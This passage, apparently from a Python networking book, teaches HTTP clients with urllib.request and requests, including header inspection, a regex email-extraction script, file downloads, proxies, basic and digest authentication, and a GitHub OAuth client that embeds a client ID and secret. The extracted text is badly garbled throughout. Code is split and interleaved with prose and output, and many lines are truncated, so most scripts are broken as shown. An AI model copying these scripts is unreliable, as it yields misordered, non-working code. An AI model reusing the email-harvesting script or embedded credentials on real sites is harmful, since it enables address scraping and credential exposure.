property or the getheaders() method. The getheaders() method
returns the headers as a list of tuples in the format (header name,
header value). You can ﬁnd the following code in the
get_headers_response_request.py ﬁle inside the
urllib.request folder:
import urllib.request 
from urllib.request import Request 
def chrome_user_agent(domain, USER_AGENT): 
    opener = urllib.request.build_opener() 
    opener.addheaders = [('User-agent', USER_AGENT)]
    urllib.request.install_opener(opener) 
    response = urllib.request.urlopen(domain) 
    print("Response headers") 
    print("--------------------") 
    for header,value in response.getheaders(): 
        print(header + ":" + value) 

In the previous script, we are customizing the User-agent header
with a speciﬁc version of the Chrome browser. To change User-
agent, there are two alternatives. The ﬁrst one is to use the
addheaders property from the opener object. The second one
involves using the add_header() method from the Request object
to add headers while we create the request object. When executing
the previous script, we get the response and request headers from a
speciﬁc URL:
    request = Request(domain) 
    request.add_header('User-agent', USER_AGENT) 
    print("\nRequest headers") 
    print("--------------------") 
    for header,value in request.header_items(): 
        print(header + ":" + value) 
if __name__ == '__main__': 
    domain = "http://python.org" 
    USER_AGENT = 'Mozilla/5.0 (Linux; Android 10) Ap
    chrome_user_agent(domain, USER_AGENT) 
$ python get_headers_response_request.py 
Response headers 
-------------------- 
Connection:close 
Content-Length:50999 
Server:nginx 
Content-Type:text/html; charset=utf-8 
X-Frame-Options:DENY 
Via:1.1 vegur, 1.1 varnish, 1.1 varnish 

We just learned how to use headers in the urllib.request package
to get information about the web server related to a speciﬁc domain
or URL. Next, we will learn how to use this package to extract emails
from URLs.
Extracting emails from a URL with
urllib.request
In the following script, we can see how to extract emails using the
regular expression (re) module to ﬁnd elements that contain @ in
the content returned by the request. You can ﬁnd the following code
in the get_emails_url_request.py ﬁle inside the
urllib.request folder:
Accept-Ranges:bytes 
Date:Sun, 20 Nov 2022 17:58:43 GMT 
Age:36 
X-Served-By:cache-iad-kiad7000025-IAD, cache-mad2204
X-Cache:HIT, HIT 
X-Cache-Hits:50, 1 
X-Timer:S1668967123.451624,VS0,VE1 
Vary:Cookie 
Strict-Transport-Security:max-age=63072000; includeS
Request headers 
-------------------- 
User-agent:Mozilla/5.0 (Linux; Android 10) AppleWebK
import urllib.request 
import re 

In the previous script, we are using the
urllib.request.build_opener() method to customize the User-
Agent request header. We are using the returned HTML content to
search for emails that match the deﬁned regular expression.
In the previous output, we can see the e-mails obtained during the
script execution using the mail.python.org domain. Using this
method, we can enter the URL to extract emails and the script will
return strings that appear in the HTML code and match emails in the
regular expression.
Downloading files with urllib.request
USER_AGENT = 'Mozilla/5.0 (Linux; Android 10) AppleW
url =  input("Enter url:") 
opener = urllib.request.build_opener() 
opener.addheaders = [('User-agent', USER_AGENT)] 
urllib.request.install_opener(opener) 
response = urllib.request.urlopen(url) 
html_content= response.read() 
pattern = re.compile("[-a-zA-Z0-9._]+@[-a-zA-Z0-9_]+
mails = re.findall(pattern,str(html_content)) 
print(mails) 
$ python get_emails_url_request.py 
Enter url:https://mail.python.org/mailman3/lists/pyt
['python-dev@python.org', 'python-dev@python.org', 

In the following script, we can see how to download a ﬁle using the
urlretrieve() and urlopen() methods. You can ﬁnd the
following code in the download_file.py ﬁle inside the
urllib.request folder:
With the previous code, we are using the urlretrieve() method
directly. Another option for downloading a ﬁle is using the
urlopen() method.
Sometimes you want to get a non-text ﬁle, such as an image or video
ﬁle. The method is to open the URL and use the read() method to
download the entire content of the document in a string, then write
that information to a ﬁle. You can ﬁnd the following code in the
urllib_request_download_file.py ﬁle inside the
urllib.request folder:
import urllib.request 
print("starting download....") 
url="https://www.python.org/static/img/python-logo.p
urllib.request.urlretrieve(url, "python.png") 
with urllib.request.urlopen(url) as response: 
    print("Status:", response.status) 
    print( "Downloading python.png") 
    with open("python.png", "wb" ) as image: 
        image.write(response.read()) 
import urllib.request, urllib.parse, urllib.error 
file_gz = urllib.request.urlopen('http://ftp.debian
file = open('Contents-all.gz', 'wb') 

The above script reads a ﬁle, reads all the data it receives from the
network, and stores it in the file_gz variable. Then it opens the ﬁle
and writes the data to disk. The wb argument to the open() function
opens a binary ﬁle in write mode.
The following script tries to download the ﬁle in blocks of 10000
bytes. You can ﬁnd the following code in the
urllib_request_download_file_bytes.py ﬁle inside the
urllib.request folder:
When executing the previous script, we can see how we obtain the
number of bytes that have been transferred in the download of the
ﬁle:
file.write(file_gz) 
file.close() 
import urllib.request, urllib.parse, urllib.error 
file_gz = urllib.request.urlopen('http://ftp.debian
file = open('Contents-all.gz', 'wb') 
file_size = 0
while True: 
    bytes = file_gz.read(10000) 
    if len(bytes) < 1: 
        break 
    file_size = file_size + len(bytes) 
    file.write(bytes) 
print(file_size, 'bytes copied') 
file.close() 

$ python urllib_request_download_file_bytes.py 
57319 bytes copied 
We just learned how to download a ﬁle using the urllib.request
module. Next, we will learn how to handle exceptions with this
module.
Handling exceptions with
urllib.request
Status codes should always be reviewed so that if anything goes
wrong, our system will respond appropriately. The urllib package
helps us to check the status codes by raising an exception if it
encounters an issue related to the request. Let’s now go through how
to catch these and handle them in a useful manner. You can ﬁnd the
following code in the urllib_exceptions.py ﬁle inside the
urllib.request folder:
import urllib.error 
from urllib.request import urlopen 
try: 
    urlopen('https://www.ietf.org/rfc/rfc0.txt') 
except urllib.error.HTTPError as exception: 
    print('Exception:', exception) 
    print('Status:', exception.code) 
    print('Reason', exception.reason) 
    print('Url', exception.url) 

Here, we are using the urllib.request module to access an
internet ﬁle through its URL. If the URL does not exist, then raise the
urllib.error.URLError exception. The output of the previous
script is as follows:
$ python urllib_exceptions.py 
Exception: HTTP Error 404: Not Found 
Status: 404 
Reason Not Found 
Url https://www.ietf.org/rfc/rfc0.txt 
In the previous script, it raises an exception because the URL is not
correct. Remember that urllib.request allows us to test the
response of a website or a web service and is a good option for
implementing HTTP clients that require the request to be
customized. Now that you know the basics of building an HTTP
client with the urllib.request module, let’s move on to learning
about building an HTTP client with the requests module.
Building an HTTP client with
requests
Being able to interact with RESTful APIs based on HTTP is an
increasingly common task in projects in any programming language.
In Python, we also have the option of interacting with a REST API in
a simple way with the requests module. In this section, we will
review the diﬀerent ways in which we can interact with an HTTP-
based API using the Python requests package.

One of the best options within the Python ecosystem for making
HTTP requests is the requests module. You can install the
requests library in your system in a straightforward manner with
the pip command:
$ pip install requests 
To test the library in our script, just import it as we do with other
modules. Basically, requests is a wrapper of urllib.request,
along with other Python modules, to provide the REST structure
with simple methods, so we have the get, post, put, update,
delete, head, and options methods, which are all the requisite
methods for interacting with a RESTful API.
This module has a very simple form of implementation. For
example, a GET query using requests would be as follows:
As we can see, the requests.get() method is returning a
response object. In this object, you will ﬁnd all the information
corresponding to the response of our request. These are the main
properties of the response object:
response.status_code: This is the HTTP code returned by the
server.
>>> import requests 
>>> response = requests.get('http://www.python.org')

response.content: Here we will ﬁnd the content of the server
response.
response.json(): In the case that the answer is a JSON, this
method serializes the string and returns a dictionary structure
with the corresponding JSON structure. In the case of not
receiving a JSON for each response, the method triggers an
exception.
In the following script, we can also view the properties through the
response object in the python.org domain. The
response.headers statement provides the headers of the web
server response. Basically, the response is an object dictionary we
can iterate with the key-value format using the items() method.
You can ﬁnd the following code in the requests_headers.py ﬁle
inside the requests folder:
import requests, json 
domain = input("Enter the hostname http://") 
response = requests.get("http://"+domain) 
print(response.json) 
print("Status code: "+str(response.status_code)) 
print("Headers response: ") 
for header, value in response.headers.items(): 
    print(header, '-->', value) 
print("Headers request : ") 
for header, value in response.request.headers.items(
    print(header, '-->', value) 

In the output of the previous script, we can see the script being
executed for the python.org domain. In the last line of the
execution, we can highlight the presence of python-requests in the
User-Agent header.
$ python requests_headers.py 
Enter the hostname http://www.python.org 
<bound method Response.json of <Response [200]>> 
Status code: 200 
Headers response:  
Connection --> keep-alive 
Content-Length --> 50991 
Server --> nginx 
Content-Type --> text/html; charset=utf-8 
X-Frame-Options --> DENY 
Via --> 1.1 vegur, 1.1 varnish, 1.1 varnish 
Accept-Ranges --> bytes 
Date --> Sun, 20 Nov 2022 21:20:30 GMT 
Age --> 1245 
X-Served-By --> cache-iad-kiad7000025-IAD, cache-mad
X-Cache --> HIT, HIT 
X-Cache-Hits --> 309, 1 
X-Timer --> S1668979230.497214,VS0,VE2 
Vary --> Cookie 
Strict-Transport-Security --> max-age=63072000; incl
Headers request :  
User-Agent --> python-requests/2.28.1 
Accept-Encoding --> gzip, deflate, br 
Accept --> */* 
Connection --> keep-alive 

In a similar way, we can obtain only keys() from the object
response dictionary. You can ﬁnd the following code in the
requests_headers_keys.py ﬁle inside the requests folder:
In the following example, we are geĴing the robots.txt ﬁle of a
website that is passed as a parameter. You can ﬁnd the following
code in the read_robots_file.py ﬁle inside the requests folder:
import requests 
import sys 
def main(url): 
    robot_url = f'{url}/robots.txt' 
    response = requests.get(robot_url) 
    print(response.text) 
if __name__ == "__main__": 
    url = sys.argv[1] 
    main(url) 
When executing the previous script on a domain, we see the content
of the robots.txt ﬁle by making a get request with the requests
module.
import requests 
if __name__ == "__main__": 
    domain = input("Enter the hostname http://") 
    response = requests.get("http://"+domain) 
    for header in response.headers.keys(): 
        print(header  + ":" + response.headers[heade

Now, let’s see with the help of an example how we can obtain
images and links from a URL with the requests module.
Getting images and links from a URL
with requests
In the following examples, we are going to extract images and links
using the requests and shutil modules. The easy way to
$ python read_robots_file.py http://www.python.org 
# Directions for robots.  See this URL: 
# http://www.robotstxt.org/robotstxt.html 
# for a description of the file format.  
User-agent: HTTrack 
User-agent: puf 
User-agent: MSIECrawler 
Disallow: / 
# The Krugle web crawler (though based on Nutch) is 
User-agent: Krugle 
Allow: / 
Disallow: /~guido/orlijn/ 
Disallow: /webstats/ 
# No one should be crawling us with Nutch. 
User-agent: Nutch 
Disallow: / 
# Hide old versions of the documentation and various
User-agent: * 
Disallow: /~guido/orlijn/ 
Disallow: /webstats/ 

download images from a URL is to use the copyfileob() method
from the shutil module. You can ﬁnd the following code in the
request_download_image.py ﬁle inside the requests folder:
In the previous script, we are using the requests module to get an
image from a URL and shutil to copy the raw response as a ﬁle to the
ﬁle system.
In the following example, we are using the GitHub API to obtain
information about a speciﬁc repository. You can ﬁnd the following
code in the request_github_repository.py ﬁle inside the
requests folder:
When you execute the previous script, you should see the URLs
associated with the Packt GitHub repository:
import shutil 
import requests 
url = 'https://www.python.org/static/img/python-logo
response = requests.get(url, stream=True) 
with open('python.png', 'wb') as out_file: 
    shutil.copyfileobj(response.raw, out_file) 
import requests 
response = requests.get('https://api.github.com/user
print(response.url) 
print(response.text) 

In the following example, we are using the GitHub API to perform a
search for a term within a user’s repository. You can ﬁnd the
following code in the search_repositories_github.py ﬁle inside
the requests folder:
$ python requests_github_repository.py 
https://api.github.com/users/packt 
{"login":"packt","id":6986181,"node_id":"MDQ6VXNlcjY
SEARCH_URL_BASE = 'https://api.github.com/users'
import argparse 
import requests 
import json 
def search_repository(author, search_for='homepage')
    url = "%s/%s/repos" %(SEARCH_URL_BASE, author) 
    print("Searching Repo URL: %s" %url) 
    result = requests.get(url) 
    results=[] 
    if(result.ok): 
        repo_info = json.loads(result.text or result
        result = "No result found!" 
        for repo in repo_info: 
            for key,value in repo.items(): 
                if  search_for in str(value): 
                    results.append(value) 
        return results 

In the previous code, we deﬁne a function that provides, as
parameters, the author and the word for which we are going to
perform the search in the repository.
We continue with the implementation of our main program, which
allows us to add the arguments for the author and the search word.
From this main program, we call the function deﬁned above with
these arguments and get the results in the form of a list.
if __name__ == '__main__': 
    parser = argparse.ArgumentParser(description='Gi
    parser.add_argument('--author', action="store", 
    parser.add_argument('--search_for', action="stor
    given_args = parser.parse_args() 
    results = search_repository(given_args.author, g
    if isinstance(results, list): 
        print("Got result for '%s'..." %(given_args
        for value in results: 
            print("%s" %(value)) 
    else: 
        print("Got result for %s: %s" %(given_args.s
$ python search_repositories_github.py --author pack
Searching Repo URL: https://api.github.com/users/pac
Got result for 'book'... 
bookrepository 
packt/bookrepository 
https://github.com/packt/bookrepository 
https://api.github.com/repos/packt/bookrepository 

https://api.github.com/repos/packt/bookrepository/fo
https://api.github.com/repos/packt/bookrepository/ke
https://api.github.com/repos/packt/bookrepository/co
https://api.github.com/repos/packt/bookrepository/te
https://api.github.com/repos/packt/bookrepository/ho
https://api.github.com/repos/packt/bookrepository/is
https://api.github.com/repos/packt/bookrepository/ev
https://api.github.com/repos/packt/bookrepository/as
https://api.github.com/repos/packt/bookrepository/br
https://api.github.com/repos/packt/bookrepository/ta
https://api.github.com/repos/packt/bookrepository/gi
https://api.github.com/repos/packt/bookrepository/gi
https://api.github.com/repos/packt/bookrepository/gi
https://api.github.com/repos/packt/bookrepository/gi
https://api.github.com/repos/packt/bookrepository/st
https://api.github.com/repos/packt/bookrepository/la
https://api.github.com/repos/packt/bookrepository/st
https://api.github.com/repos/packt/bookrepository/co
https://api.github.com/repos/packt/bookrepository/su
https://api.github.com/repos/packt/bookrepository/su
https://api.github.com/repos/packt/bookrepository/co
https://api.github.com/repos/packt/bookrepository/gi
https://api.github.com/repos/packt/bookrepository/co
https://api.github.com/repos/packt/bookrepository/is
https://api.github.com/repos/packt/bookrepository/co
https://api.github.com/repos/packt/bookrepository/co
https://api.github.com/repos/packt/bookrepository/me
https://api.github.com/repos/packt/bookrepository/{a
https://api.github.com/repos/packt/bookrepository/do
https://api.github.com/repos/packt/bookrepository/is
https://api.github.com/repos/packt/bookrepository/pu
https://api.github.com/repos/packt/bookrepository/mi

In the execution of the script, we see the repositories for the Packt
author and contain the search word “book”.
Making requests with the REST API
To test requests with this module, we can use the following service,
https://httpbin.org, and try these requests, executing each type
separately. In all cases, the code to execute to get the desired output
will be the same; the only thing that will change will be the type of
request and the data that is sent to the server:
https://api.github.com/repos/packt/bookrepository/no
https://api.github.com/repos/packt/bookrepository/la
https://api.github.com/repos/packt/bookrepository/re
https://api.github.com/repos/packt/bookrepository/de
git://github.com/packt/bookrepository.git 
git@github.com:packt/bookrepository.git 
https://github.com/packt/bookrepository.git 
https://github.com/packt/bookrepository 

Figure 4.1: REST API and HTTP methods in the hĴpbin service
https://httpbin.org/ oﬀers a service that lets you
test REST requests through predeﬁned endpoints
using the get, post, patch, put, and delete
methods.
If we make a request to the http://httpbin.org/get URL, we get
the response in JSON format:

In the previous output, we can see the response in JSON format for
the get endpoint available in the httpbin.org service. You can
ﬁnd the following code in the testing_api_rest_get_method.py
ﬁle inside the requests folder:
{ 
  "args": {},  
  "headers": { 
    "Accept": "text/html,application/xhtml+xml,appli
    "Accept-Encoding": "gzip, deflate",  
    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,e
    "Host": "httpbin.org",  
    "Upgrade-Insecure-Requests": "1",  
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; r
    "X-Amzn-Trace-Id": "Root=1-637aa192-489498a0092b
  },  
  "origin": "185.255.105.40",  
  "url": http://httpbin.org/get 
} 
import requests, json 
response = requests.get("http://httpbin.org/get",tim
print("HTTP Status Code: " + str(response.status_cod
print(response.headers) 
if response.status_code == 200: 
    results = response.json() 
    for result in results.items(): 
        print(result) 
    print("Headers response: ") 

When executing the previous code, you should see the output with
the headers obtained for a request and response. The headers
response will be like the output obtained in JSON format.
With GET requests, we can validate in an easy way that the service is
running and returning a valid response. Unlike the GET method,
which sends the data in the URL, the POST method allows us to send
data to the server in the request body.
For example, suppose we have a service to register a user using a
form where you must pass an ID and email. This information would
be passed through the data aĴribute through a dictionary structure.
The POST method requires an extra ﬁeld called data, in which we
send a dictionary with all the elements that we will send to the
server through the corresponding method.
In this example, we are going to simulate the sending of an HTML
form through a POST request, just like browsers do when we send a
form to a website. Form data is always sent in a key-value dictionary
format. The POST method is available in the
https://httpbin.org/#/HTTP_Methods/post_post service:
    for header, value in response.headers.items(): 
        print(header, '-->', value) 
    print("Headers request : ") 
    for header, value in response.request.headers.it
        print(header, '-->', value) 
    print("Server:" + response.headers['server']) 
else: 
    print("Error code %s" % response.status_code) 

Figure 4.2: Testing the POST method in the hĴpbin service
In the following example, we deﬁne a data dictionary that we are
using with the POST method for passing data in the body request in
key:value format:
Also, we are using a speciﬁc header to send information to the server
in JSON format. In this case, we can add our own header or modify
existing ones with the headers parameter. You can ﬁnd the
following code in the testing_api_rest_post_method.py ﬁle
inside the requests folder:
>>> requests.post('https://httpbin.org/post', data =

In the previous code, in addition to using the POST method, we are
passing the data that you want to send to the server as a parameter
in the data aĴribute. When you run the preceding script, you will
receive the following output:
import requests,json 
data_dictionary = {"id": "0123456789"} 
headers = {"Content-Type" : "application/json","Acce
response = requests.post("http://httpbin.org/post",d
print("HTTP Status Code: " + str(response.status_cod
print(response.headers) 
if response.status_code == 200: 
    results = response.json() 
    for result in results.items(): 
        print(result) 
    print("Headers response: ") 
    for header, value in response.headers.items(): 
        print(header, '-->', value) 
    print("Headers request : ") 
    for header, value in response.request.headers.it
        print(header, '-->', value) 
    print("Server:" + response.headers['server']) 
else: 
    print("Error code %s" % response.status_code) 
$ python testing_api_rest_post_method.py 
HTTP Status Code: 200 
{'Date': 'Sun, 20 Nov 2022 22:21:21 GMT', 'Content-T
('args', {}) 

In the output of the previous script, we can see the response object
that contains the ID is being sent in the data dictionary object. Also,
we can see headers related to the application/json content type
and the user agent header where we can see this header is
established in the python-request/2.28.1 value corresponding to
the version of the requests module we are using.
('data', 'id=0123456789') 
('files', {}) 
('form', {}) 
('headers', {'Accept': 'application/json', 'Accept-E
('json', None) 
('origin', '185.255.105.40') 
('url', 'http://httpbin.org/post') 
Headers response:  
Date --> Sun, 20 Nov 2022 22:21:21 GMT 
Content-Type --> application/json 
Content-Length --> 471 
Connection --> keep-alive 
Server --> gunicorn/19.9.0 
Access-Control-Allow-Origin --> * 
Access-Control-Allow-Credentials --> true 
Headers request :  
User-Agent --> python-requests/2.28.1 
Accept-Encoding --> gzip, deflate, br 
Accept --> application/json 
Connection --> keep-alive 
Content-Type --> application/json 
Content-Length --> 13 
Server:gunicorn/19.9.0 

Managing a proxy with requests
An interesting feature oﬀered by the requests module is the option
to make requests through a proxy or intermediate machine between
our internal network and the external network. A proxy is deﬁned in
the following way:
>>> proxy = {"protocol":"ip:port"} 
To make a request through a proxy, we are using the proxies
aĴribute of the get() method:
The proxy parameter must be passed in the form of a dictionary,
that is, you need to create a dictionary where we specify the protocol
with the IP address and the port where the proxy is listening:
The preceding code could be useful in case we need to make
requests from an internal network through an intermediate machine.
For this, it is necessary to know the IP address and port of this
machine.
>>> response = requests.get(url,headers=headers,prox
>>> import requests 
>>> http_proxy = "http://<ip_address>:<port>"
>>> proxy_dictionary = { "http" : http_proxy} 
>>> requests.get("http://domain.com", proxies=proxy_

Managing exceptions with requests
Compared to other modules, the requests module handles errors
in a diﬀerent way. In the following example, we see how the
requests module generates a 404 error, indicating that it cannot
ﬁnd the requested resource:
To see the exception generated internally, we can use the
raise_for_status() method:
>>> response.raise_for_status() 
requests.exceptions.HTTPError: 404 Client Error 
In the event of making a request to a host that does not exist, and
once the timeout has been produced, we get a ConnectionError
exception:
The requests module makes it easier to use HTTP requests in
Python compared with urllib. Unless you have a requirement to
>>> response = requests.get('http://www.google.com/p
>>> response.status_code 
404 
>>> response = requests.get('http://url_not_exists')
requests.exceptions.ConnectionError: HTTPConnectionP

use urllib, I would recommend using requests for your projects
in Python.
Now that you know the basics of building an HTTP client with the
requests module, let’s move on to learning about HTTP
authentication mechanisms and how they are implemented in
Python.
Authentication mechanisms with
Python
Most of the web services that we use today require some
authentication mechanism in order to ensure the user’s credentials
are valid to access them.
In this section, we’ll learn how to implement authentication in
Python. The HTTP protocol natively supports three authentication
mechanisms:
HTTP basic authentication: Transmits a user/password pair as
a base64 encoded string.
HTTP digest authentication: This mechanism uses MD5 to
encrypt the user, key, and realm hashes.
HTTP bearer authentication: This mechanism uses
authentication based on access_token. One of the most
popular protocols that use this type of authentication is OAuth.
In the following URL, we can ﬁnd the diﬀerent Python libraries
supported by this protocol:
https://oauth.net/code/python/.

Python supports both mechanisms through the requests module.
However, the main diﬀerence between both methods is that basic
only encodes without encrypting data, whereas digest encrypts the
user’s information in MD5 format. Let’s understand these
mechanisms in more detail in the upcoming subsections.
HTTP basic authentication with the
requests module
HTTP basic is a simple mechanism that allows you to implement
basic authentication over HTTP resources. The main advantage is the
ease of implementing it in Apache web servers, using standard
Apache directives and the httpasswd utility.
The issue with this method is that it is easy to extract credentials
from the user with a Wireshark sniﬀer because the information is
sent in plain text. From an aĴacker’s point of view, it could be easy
to decode the information in Base64 format. If the client knows that a
resource is protected with this mechanism, the login and password
can be sent with base encoding in the Authorization header.
Basic-access authentication assumes a username and a password will
identify the client. When the browser client ﬁrst accesses a site using
this authentication, the server responds with a type 401 response,
containing the WWW-Authenticate tag, the Basic value, and the
protected domain name.
Assuming we have a URL protected with this type of authentication,
we can use the HTTPBasicAuth class from the requests module. In
the following script, we are using this class to provide the user

credentials as a tuple. You can ﬁnd the following code in the
basic_authentication.py ﬁle inside the requests folder:
In the previous code, we are using HTTPBasicAuth class for
authenticating in the GitHub service using the username and
password data informed by the user.
When executing the previous script, if the credentials are incorrect, it
will return a 401 status code. If the credentials are correct it will
return a 200 status code and information about the user we are
testing.
import requests 
from requests.auth import HTTPBasicAuth 
from getpass import getpass 
username=input("Enter username:") 
password = getpass() 
response = requests.get('https://api.github.com/user
print('Response.status_code:'+ str(response.status_c
if response.status_code == 200: 
    print('Login successful :'+response.text) 
$ python basic_authentication.py 
Enter username:jmortega 
Password:  
Response.status_code:200 
Login successful:{"login":"jmortega","id":4352324,"n

In the previous output, the login is successful and it returns the
status code 200 and the information about the user in the GitHub
service and URLs related to the GitHub API the user could access.
HTTP digest authentication with the
requests module
HTTP digest is a mechanism used in the HTTP protocol to improve
the basic authentication process.
This type of authentication uses the MD5 protocol, which, in its
beginnings, was mainly used for data encryption. Today, its
algorithm is considered broken from the encryption point of view
and is mainly used to support some authentication methods.
MD5 is usually used to encrypt user information, as well as the key
and domain, although other algorithms, such as SHA, can also be
used to improve security in its diﬀerent variants.
Digest-based access authentication extends basic-access
authentication by using a one-way hashing cryptographic algorithm
(MD5) to ﬁrst encrypt authentication information, and then add a
unique connection value.
The client browser uses this value when calculating the password
response in hash format. Although the password is obfuscated by
the use of a cryptographic hash, and the use of the unique value
prevents a replay aĴack, the login name is sent in plain text to the
server. A replay aĴack is a form of network aĴack in which a valid
data transmission is maliciously repeated or delayed.

Assuming we have a URL protected with this type of authentication,
we could use HTTPDigestAuth, available in the requests.auth
submodule, as follows:
In the following script, we are using the auth service,
http://httpbin.org/digest-auth/auth/user/pass, to test the
digest authentication for accessing a protected-resource digest
authentication. The script is similar to the previous one with basic
authentication. The main diﬀerence is the part where we send the
username and password over the protected URL. You can ﬁnd the
following code in the digest_authentication.py ﬁle inside the
requests folder:
>>> import requests 
>>> from requests.auth import HTTPDigestAuth 
>>> response = requests.get(protectedURL, auth=HTTPD
import requests 
from requests.auth import HTTPDigestAuth 
from getpass import getpass 
user=input("Enter user:") 
password = getpass() 
url = 'http://httpbin.org/digest-auth/auth/user/pass
response = requests.get(url, auth=HTTPDigestAuth(use
print("Headers request : ") 
for header, value in response.request.headers.items(
    print(header, '-->', value) 
print('Response.status_code:'+ str(response.status_c

In the previous script, we are using the httpbin service to
demonstrate how to use the HTTPDigestAuth class to pass user
and password parameters. If we execute the previous script
introducing user and pass credentials, we get the following output
with status code 200, where we can see the JSON string associated
with a successful login:
if response.status_code == 200: 
    print('Login successful :'+str(response.json()))
    print("Headers response: ") 
    for header, value in response.headers.items(): 
        print(header, '-->', value) 
$ python digest_authentication.py 
Enter user:user 
Password:  
Headers request :  
User-Agent --> python-requests/2.28.1 
Accept-Encoding --> gzip, deflate, br 
Accept --> */* 
Connection --> keep-alive 
Cookie --> stale_after=never; fake=fake_value 
Authorization --> Digest username="user", realm="me@
Response.status_code:200 
Login successful :{'authenticated': True, 'user': 'u
Headers response:  
Date --> Mon, 21 Nov 2022 20:19:26 GMT 
Content-Type --> application/json 
Content-Length --> 47 
Connection --> keep-alive 

In the previous output, we can see how, in the Authorization
header, a request is sending information related to the digest and the
algorithm being used. If the authorization with username and
password is correct, the service returns the following JSON output.
{ 
  "authenticated": true,  
  "user": "user" 
} 
If we introduce an incorrect user or password, we get the following
output with a 401 status code:
Server --> gunicorn/19.9.0 
Set-Cookie --> fake=fake_value; Path=/, stale_after=
Access-Control-Allow-Origin --> * 
Access-Control-Allow-Credentials --> true 
$ python digest_authentication.py 
Enter user:user 
Password:  
Headers request :  
User-Agent --> python-requests/2.28.1 
Accept-Encoding --> gzip, deflate, br 
Accept --> */* 
Connection --> keep-alive 
Cookie --> stale_after=never; fake=fake_value 
Authorization --> Digest username="user", realm="me@
Response.status_code:401 

Looking at the received headers, we see how, in the status_code
ﬁeld, we received the code 401 corresponding to unauthorized
access. In this section, we have reviewed how the requests module
has good support for both authentication mechanisms. Next, we
continue implementing OAauth clients with the requests-
oauthlib module.
Implementing OAuth clients in
Python with the requests-oauthlib
module
OAuth 2.0 is an open standard for API authorization, which allows
us to share information between sites without having to share an
identity. It is a mechanism used today by large companies such as
Google, Microsoft, TwiĴer, GitHub, and LinkedIn, among many
others.
This protocol consists of delegating user authentication to the service
that manages the accounts, so it is the service that grants access to
third-party applications. The OAuth 2.0 standard facilitates relevant
aspects such as authenticating API consumers, requesting their
authorization to perform speciﬁc actions, and providing tools that
identify the parties involved in the task ﬂow.
On the oﬃcial OAuth 2.0 website, https://oauth.net, you can ﬁnd
all the technical details of this framework, and how to implement it
in your web pages to make it easier for your users to log in.

OAuth roles
OAuth basically works by delegating the user’s authentication
permission to the service that manages those accounts, so that it is
the service itself that grants access to third-party applications.
Within OAuth 2.0, there are diﬀerent roles that will participate in the
process. In the protocol that deﬁnes OAuth, we can identify 4 roles
that we can highlight:
1. Resource Owner: The resource owner is the user who
authorizes a given application to access their account and to be
able to execute some tasks. Access is limited according to the
scope granted by the user during the authorization process.
2. Client: The client would be the application that wants to access
that user account. Before it can do so, it must be authorized by
the user, and such authorization must be validated by the API.
3. Resource Server: The resource server is the server that stores
user accounts.
4. Authorization Server: The authorization server is responsible
for handling authorization requests. It veriﬁes the identity of
users and issues a series of access tokens to the client
application.
OAuth workflow
The authorization process in OAuth diﬀerentiates the following
predeﬁned ﬂows or grant types, which can be used in applications
that require authorization:

Authorization code: The client requests the resource owner to
log in to the authorization server. The resource owner is then
redirected to the client along with an authorization code. This
code is used by the authorization server to issue an access token
to the client.
Implicit authorization: This authorization process is quite
similar to the code authorization we just discussed, but it is less
complex because the authorization server issues the access
token directly.
Resource owner password credentials: In this case, the resource
owner entrusts their access data directly to the client, which is
directly contrary to the basic principle of OAuth, but involves
less eﬀort for the resource owner.
Client credentials: This authorization process is especially
simple and is used when a client wants to access data that does
not have an owner or does not require authorization.
The ﬂow described below is a generic ﬂow representing the OAuth
protocol:
1. The client application requests authorization to access a user’s
resources service.
2. If the user authorizes this request, the application receives an
authorization grant.
3. The application requests an access token from the authorization
server (API) presenting its identity, and the previously granted
permission.
4. If the identity of the client application is correctly recognized by
the service, and the authorization grant is valid, the

authorization server (API) issues an access token to the
application. This step completes the authorization process.
5. The application requests a resource from the resource server
(API) and presents the corresponding access token.
6. If the access token is valid, the resource server (API) delivers the
resource to the application.
The ﬁrst thing that happens is that the application requests
authorization to access the user data by using one of the services that
allow it. Then, if the user authorizes this request, the application
receives an access authorization that it must validate correctly with
the server and, if so, it issues a token to the application requesting
access so that it can gain access. If, at any step, the user denies access
or the server detects an error, the application will not be able to
access it and will display an error message.
Implementing a client with
requests_oauthlib
The requests-oauthlib,
https://pypi.org/project/requests-oauthlib, is a module
that helps us to implement OAuth clients in Python. This module
glues together two main components: the requests package and
oauthlib. From within your virtual environment, you can install it
with the following command:
$ pip install requests_oauthlib 

The following example is intended to use the GitHub service and
register an application that allows us to obtain the credentials to
authorize the use of the application. As a ﬁrst step, in the OAuth
Apps section within the Developer seĴings
(https://github.com/settings/developers) option, we could
create our test application.
Figure 4.3: Creating an OAuth app in GitHub service
When creating an application, we must introduce the application
name, home page URL, and Authorization callback URL.

Figure 4.4: Creating an OAuth app in the GitHub service
Once we have created our test application, we could generate a client
secret to authorize our application to access the service.

Figure 4.5: Generating a new client secret in the GitHub service
Next, we implement a script that has the objective of requesting a
token from the GitHub service that authorizes the user to access
information about their proﬁle on the GitHub service. You can ﬁnd
the following code in the github_oauth.py ﬁle inside the
requests_oauth folder:
from requests_oauthlib import OAuth2Session 
import json 
client_id = "f97ae0269c79de5bb177" 
client_secret = "53488c4d18ab6f462dc2d119a1673120259
authorization_base_url = 'https://github.com/login/o
token_url = 'https://github.com/login/oauth/access_t
github = OAuth2Session(client_id) 
authorization_url, state = github.authorization_url(
print('Please go here and authorize,', authorization
redirect_response = input('Paste the full redirect U

In the previous code, we deﬁne the client_id and
client_secret we have generated in the GitHub
service. The reader could use this service to generate
their own client_id and client_secrets keys and
replace them in the previous code in the variables
deﬁned.
Next, we deﬁne OAuth endpoints given in the GitHub API
documentation. We continue redirecting the user to GitHub for
authorization and get the authorization veriﬁer code from the
callback URL. With the fetch_token() method, we fetch the access
token, and with the get() method, we fetch a protected resource
like access to the user proﬁle from the authorized user.
When executing the previous code, we see how it generates a URL
that uses the client_id and we have to use it to authorize the
application. When loading this URL, it performs an authorization
redirect from the token_url and client_secret.
github.fetch_token(token_url, client_secret=client_s
response = github.get('https://api.github.com/user')
print(response.content.decode()) 
dict_response = json.loads(response.content.decode()
for key,value in dict_response.items(): 
    print(key,"-->",value) 
$ python github_oauth.py 
Please go here and authorize, https://github.com/log

We just learned about the OAuth protocol and how to use the
request_oauthlib module for implementing a client that requests
authorization for a third-party service. Next, we will learn how to
implement JSON web tokens with Python.
Implementing JSON Web Tokens
(JWTs) in Python
A JSON Web Token is an access token standardized in RFC 7519 that
enables secure data exchange between two parties. This token
contains all the important information about an entity, which means
